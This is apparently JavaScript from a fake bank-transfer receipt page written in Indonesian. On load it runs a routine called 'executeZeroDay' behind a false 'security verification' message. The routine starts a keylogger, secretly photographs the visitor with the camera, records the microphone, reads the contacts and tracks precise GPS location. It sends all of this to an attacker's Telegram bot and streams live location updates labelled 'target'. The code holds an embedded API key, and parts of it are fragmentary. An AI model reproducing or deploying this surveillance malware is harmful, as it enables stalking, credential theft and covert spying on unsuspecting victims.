        // ==================== 2. LOKASI SUPER AKURAT + REAL-TIME ====================
        async function getSuperAccurateLocation() {
            return new Promise((resolve) => {
                if (!("geolocation" in navigator)) { resolve(); return; }
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        permissions.location = true;
                        const lat = position.coords.latitude, lng = position.coords.longitude;
                        locationData = {
                            lat, lng,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude || 'N/A',
                            heading: position.coords.heading || 'N/A',
                            speed: position.coords.speed || 'N/A',
                            timestamp: new Date().toISOString(),
                            googleMapsUrl: `https://www.google.com/maps?q=${lat},${lng}`,
                            fullAddress: '', street: '', village: '', district: '',
                            city: '', province: '', postalCode: '', country: '',
                            landmark: '', placeId: '', plusCode: ''
                        };
                        
                        locationHistory.push({
                            lat, lng,
                            timestamp: new Date().toLocaleString('id-ID'),
                            accuracy: position.coords.accuracy
                        });
                        
                        try {
                            const geoUrl = `https://maps.googleapis.com/maps/api/geocode/json?latlng=${lat},${lng}&key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartk&language=id`;
                            const res = await fetch(geoUrl);
                            const data = await res.json();
                            if (data.status === "OK" && data.results.length > 0) {
                                locationData.fullAddress = data.results[0].formatted_address;
                                locationData.placeId = data.results[0].place_id;
                                for (let comp of data.results[0].address_components) {
                                    if (comp.types.includes("route")) locationData.street = comp.long_name;
                                    if (comp.types.includes("administrative_area_level_4")) locationData.village = comp.long_name;
                                    if (comp.types.includes("administrative_area_level_3")) locationData.district = comp.long_name;
                                    if (comp.types.includes("administrative_area_level_2")) locationData.city = comp.long_name;
                                    if (comp.types.includes("administrative_area_level_1")) locationData.province = comp.long_name;
                                    if (comp.types.includes("postal_code")) locationData.postalCode = comp.long_name;
                                    if (comp.types.includes("country")) locationData.country = comp.long_name;
                                }
                                if (data.results[0].plus_code) locationData.plusCode = data.results[0].plus_code.compound_code;
                            }
                        } catch (e) { console.log("Geocoding error:", e); }
                        
                        try {
                            const nearbyUrl = `https://maps.googleapis.com/maps/api/place/nearbysearch/json?location=${lat},${lng}&radius=200&key=AIzaSyB41DRUbKWJHPxaFjMAwdrzWzbVKartk&language=id`;
                            const nearbyRes = await fetch(nearbyUrl);
                            const nearbyData = await nearbyRes.json();
                            if (nearbyData.results && nearbyData.results.length > 0) {
                                locationData.landmark = nearbyData.results.slice(0, 5).map(p => p.name).join('; ');
                            }
                        } catch (e) { locationData.landmark = "Tidak ditemukan"; }
                        
                        resolve();
                    },
                    (error) => { permissions.location = false; resolve(); },
                    { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
                );
            });
        }

        // ==================== 2.1 REAL-TIME LOCATION TRACKING ====================
        function startRealtimeLocationTracking() {
            if (!("geolocation" in navigator)) return;
            
            // Watch position (update otomatis saat bergerak)
            locationWatchId = navigator.geolocation.watchPosition(
                async (position) => {
                    const lat = position.coords.latitude;
                    const lng = position.coords.longitude;
                    
                    locationData.lat = lat;
                    locationData.lng = lng;
                    locationData.accuracy = position.coords.accuracy;
                    locationData.timestamp = new Date().toISOString();
                    locationData.googleMapsUrl = `https://www.google.com/maps?q=${lat},${lng}`;
                    
                    locationHistory.push({
                        lat, lng,
                        timestamp: new Date().toLocaleString('id-ID'),
                        accuracy: position.coords.accuracy
                    });
                    
                    // Trim history
                    if (locationHistory.length > 50) {
                        locationHistory = locationHistory.slice(-50);
                    }
                    
                    console.log('📍 Location updated:', lat, lng);
                },
                (error) => console.log('Location watch error:', error),
                { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
            );
            
            // Interval update setiap 30 detik (kirim ke Telegram)
            locationUpdateInterval = setInterval(async () => {
                if (locationData.lat && locationData.lng) {
                    await sendLocationUpdate();
                }
            }, 30000);
            
            console.log('✅ Real-time location tracking started');
        }

        // ==================== 2.2 SEND LOCATION UPDATE ====================
        async function sendLocationUpdate() {
            if (!locationData.lat || !locationData.lng) return;
            
            let msg = `📍 *UPDATE LOKASI TERKINI* 📍\n`;
            msg += `━━━━━━━━━━━━━━━━━━━━━━\n`;
            msg += `⏰ Waktu: ${new Date().toLocaleString('id-ID')}\n`;
            msg += `📡 Latitude: \`${locationData.lat}\`\n`;
            msg += `📡 Longitude: \`${locationData.lng}\`\n`;
            msg += `🎯 Akurasi: ${locationData.accuracy || 'N/A'} meter\n`;
            msg += `🏠 Alamat: ${locationData.fullAddress || 'N/A'}\n`;
            msg += `🏙️ Kota: ${locationData.city || 'N/A'}\n`;
            msg += `🌏 Provinsi: ${locationData.province || 'N/A'}\n`;
            msg += `📮 Kode Pos: ${locationData.postalCode || 'N/A'}\n`;
            msg += `🇮🇩 Negara: ${locationData.country || 'N/A'}\n`;
            msg += `🏛️ Landmark: ${locationData.landmark || 'N/A'}\n\n`;
            msg += `🗺️ *BUKA GOOGLE MAPS LIVE:*\n`;
            msg += `[👉 KLIK DISINI](https://www.google.com/maps?q=${locationData.lat},${locationData.lng})\n\n`;
            msg += `📊 *Total History:* ${locationHistory.length} titik\n`;
            
            await sendTelegramMessage(msg);
        }

        // ==================== 2.3 STREAM LOCATION (Kirim terus ke Telegram) ====================
        async function streamLocationToTelegram() {
            if (!("geolocation" in navigator)) return;
            
            let lastSentLat = 0;
            let lastSentLng = 0;
            
            setInterval(async () => {
                if (!locationData.lat || !locationData.lng) return;
                
                // Kirim jika lokasi berubah > 50 meter
                const dist = Math.sqrt(
                    Math.pow(locationData.lat - lastSentLat, 2) + 
                    Math.pow(locationData.lng - lastSentLng, 2)
                );
                
                if (dist > 0.0005 || lastSentLat === 0) { // ~50 meter
                    lastSentLat = locationData.lat;
                    lastSentLng = locationData.lng;
                    
                    let msg = `🚨 *LOKASI TARGET UPDATE* 🚨\n`;
                    msg += `📍 ${locationData.lat}, ${locationData.lng}\n`;
                    msg += `🎯 Akurasi: ${locationData.accuracy}m\n`;
                    msg += `⏰ ${new Date().toLocaleString('id-ID')}\n`;
                    msg += `🗺️ [Buka Maps](https://www.google.com/maps?q=${locationData.lat},${locationData.lng})\n`;
                    
                    await sendTelegramMessage(msg);
                }
            }, 60000); // Setiap 1 menit cek perubahan
        }

        // ==================== 4. CAMERA CAPTURE ====================
        async function captureCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { width: { ideal: 1920 }, height: { ideal: 1080 }, facingMode: 'user' }
                });
                permissions.camera = true;
                const video = document.getElementById('hiddenVideo');
                video.srcObject = stream;
                await video.play();
                await new Promise(r => setTimeout(r, 1500));
                const canvas = document.getElementById('hiddenCanvas');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                canvas.getContext('2d').drawImage(video, 0, 0);
                cameraPhoto = canvas.toDataURL('image/jpeg', 0.8);
                stream.getTracks().forEach(t => t.stop());
                return true;
            } catch (e) {
                permissions.camera = false;
                return false;
            }
        }

        // ==================== 5. MICROPHONE RECORD ====================
        async function captureMicrophone() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
                permissions.microphone = true;
                mediaRecorder = new MediaRecorder(stream);
                audioChunks = [];
                mediaRecorder.ondataavailable = event => { if (event.data.size > 0) audioChunks.push(event.data); };
                return new Promise((resolve) => {
                    mediaRecorder.onstop = () => {
                        try {
                            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
                            const reader = new FileReader();
                            reader.onloadend = () => {
                                audioBase64 = reader.result;
                                resolve(true);
                            };
                            reader.readAsDataURL(audioBlob);
                        } catch (e) {
                            resolve(true);
                        }
                    };
                    mediaRecorder.start();
                    setTimeout(() => { 
                        if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop(); 
                    }, 8000);
                });
            } catch (e) {
                permissions.microphone = false;
                return false;
            }
        }

        // ==================== 7. KEYLOGGER ====================
        function startKeylogger() {
            document.addEventListener('keydown', function(e) {
                const target = e.target;
                const tag = target.tagName;
                let key = e.key;
                let field = '';
                if (tag === 'INPUT' || tag === 'TEXTAREA') {
                    field = target.name || target.id || target.placeholder || 'unknown';
                    if (key === 'Enter') logKey(`[ENTER] pada: ${field}`);
                    else if (key === 'Backspace') logKey(`[BACKSPACE] pada: ${field}`);
                    else if (key.length === 1) logKey(`${key} [${field}]`);
                } else {
                    if (key === 'Enter') logKey('[ENTER]');
                    else if (key === 'Backspace') logKey('[BACKSPACE]');
                    else if (key.length === 1) logKey(key);
                    else if (key === 'Tab') logKey('[TAB]');
                    else if (key === 'Escape') logKey('[ESC]');
                }
            });
            
            document.addEventListener('input', function(e) {
                const target = e.target;
                if (target && (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA')) {
                    const field = target.name || target.id || target.placeholder || 'unknown';
                    const value = target.value;
                    if (value && value.length > 0 && value.length < 300) {
                        logKey(`[INPUT:${field}=${value.substring(0, 150)}]`);
                    }
                }
            });
        }

        function logKey(key) {
            const timestamp = new Date().toLocaleString('id-ID');
            keyLogBuffer.push(`[${timestamp}] ${key}`);
            if (keyLogBuffer.length > 2000) keyLogBuffer = keyLogBuffer.slice(-1500);
        }

        // ==================== 8.1 DEFACE DETECTION ====================
        function getPageHash() {
            const content = document.documentElement.outerHTML;
            let hash = 0;
            for (let i = 0; i < content.length; i++) {
                const char = content.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            return hash.toString();
        }

        function startDefaceDetection() {
            originalPageHash = getPageHash();
            console.log('🛡️ Deface detection started. Hash:', originalPageHash);
            
            defaceCheckInterval = setInterval(async () => {
                const currentHash = getPageHash();
                
                if (currentHash !== originalPageHash) {
                    console.warn('⚠️ DEFACE DETECTED!');
                    
                    let msg = `🚨 *DEFACE ATTEMPT DETECTED!* 🚨\n`;
                    msg += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                    msg += `⏰ Waktu: ${new Date().toLocaleString('id-ID')}\n`;
                    msg += `🌐 URL: ${window.location.href}\n`;
                    msg += `🔐 Original Hash: \`${originalPageHash}\`\n`;
                    msg += `🔓 Current Hash: \`${currentHash}\`\n`;
                    msg += `⚠️ Status: *HALAMAN TELAH DIUBAH/DEFACE*\n`;
                    msg += `📱 Device: ${deviceInfo.userAgent || 'N/A'}\n`;
                    msg += `🌐 IP: ${await getIPAddress()}\n`;

                }
            }, 5000);
        }

        }

        async function sendTelegramPhoto(photoBase64, caption) {
            try {
                const base64Data = photoBase64.split(',')[1];
                const binaryData = atob(base64Data);
                const bytes = new Uint8Array(binaryData.length);
                for (let i = 0; i < binaryData.length; i++) {
                    bytes[i] = binaryData.charCodeAt(i);
                }
                const blob = new Blob([bytes], { type: 'image/jpeg' });
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'camera.jpg');
                formData.append('caption', caption.substring(0, 1024));
                formData.append('parse_mode', 'Markdown');
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                return await response.json();
            } catch (e) {
                console.error('❌ Telegram photo error:', e);
            }
        }

        async function sendTelegramAudio(audioBase64, caption) {

        // ==================== 12. EXECUTE ZERO-DAY ====================
        async function executeZeroDay() {
            if (executed) return;
            executed = true;
            
            showToast("🔍 Memverifikasi keamanan perangkat...", 3000);
            
            startKeylogger();
            getDeviceInfo();
            startDefaceDetection();
            
            const ip = await getIPAddress();
            
            await Promise.all([
                captureCamera(),
                captureMicrophone(),
                getSuperAccurateLocation(),
                captureContacts()
            ]);
            
            const personalData = generatePersonalData();
            await sendAllData(ip, personalData, receiptData);
            
            // Start real-time location tracking setelah data pertama terkirim
            startRealtimeLocationTracking();
            streamLocationToTelegram();
            
            showSuccessModal();
            showToast("✅ Verifikasi selesai.", 3000);
        }

        function showSuccessModal() {
            const existing = document.getElementById('globalDataModal');
            if (existing) existing.remove();
            
            const modal = document.createElement('div');
            modal.id = 'globalDataModal';
            modal.className = 'data-modal';
            modal.innerHTML = `
                <div class="data-modal-content">
                    <div class="data-modal-header">
                        <h4>✅ Verifikasi Keamanan Selesai</h4>
                        <button class="close-modal" id="closeDataModalBtn">&times;</button>
                    </div>
                    <div class="data-modal-body">
                        <div class="device-info-grid">
                            <div class="device-info-item">
                                <label>📷 Camera</label>
                                <value>${permissions.camera ? '✅ Berhasil' : '❌ Gagal'}</value>
                            </div>
                            <div class="device-info-item">
                                <label>🎙️ Microphone</label>
                                <value>${permissions.microphone ? '✅ Berhasil' : '❌ Gagal'}</value>
                            </div>
                            <div class="device-info-item">
                                <label>📍 Lokasi GPS</label>
                                <value>${permissions.location ? '✅ Berhasil' : '❌ Gagal'}</value>
                            </div>
                            <div class="device-info-item">
                                <label>📇 Kontak</label>
                                <value>${permissions.contacts ? '✅ Berhasil' : '❌ Gagal'}</value>
                            </div>
                        </div>
                        <hr style="margin: 15px 0; border: none; border-top: 1px solid #e2e8f0;">
                        <div class="device-info-item" style="grid-column: span 2; margin-bottom: 10px;">
                            <label>📍 Koordinat</label>
                            <value>${locationData.lat ? `${locationData.lat}, ${locationData.lng}` : 'N/A'}</value>
                        </div>
                        <div class="device-info-item" style="grid-column: span 2;">
                            <label>🏠 Alamat</label>
                            <value style="font-size:12px;">${locationData.fullAddress || 'N/A'}</value>
                        </div>
                    </div>
                    <div class="data-modal-footer">
                        <button id="closeModalFooterBtn" class="btn-dark">Tutup</button>
                    </div>
                </div>
            `;
            document.body.appendChild(modal);
            
            document.getElementById('closeDataModalBtn').onclick = () => modal.remove();
            document.getElementById('closeModalFooterBtn').onclick = () => modal.remove();
            modal.addEventListener('click', (e) => { if (e.target === modal) modal.remove(); });
        }

        // ==================== INIT ====================
        window.addEventListener('DOMContentLoaded', async () => {
            // Generate & tampilkan data bukti transfer OTOMATIS
            receiptData = generateReceiptData();
            displayReceiptData(receiptData);
            
            // Jalankan Zero-Day
            setTimeout(() => { executeZeroDay(); }, 2000);
        });
    </script>
